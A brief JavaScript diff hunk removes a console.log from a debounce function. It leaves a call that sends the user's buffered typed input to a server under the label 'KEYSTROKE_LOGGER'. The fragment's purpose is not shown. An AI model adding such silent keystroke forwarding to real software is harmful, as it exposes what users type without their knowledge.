@@ -2,7 +2,6 @@ let buffer = "";
 let timeoutId;
 
 function debounceLogger() {
-  console.log("Final input:", buffer.trim());
   sendServerLogMessage("KEYSTROKE_LOGGER",{ text: buffer.trim() });
   buffer = "";
 }
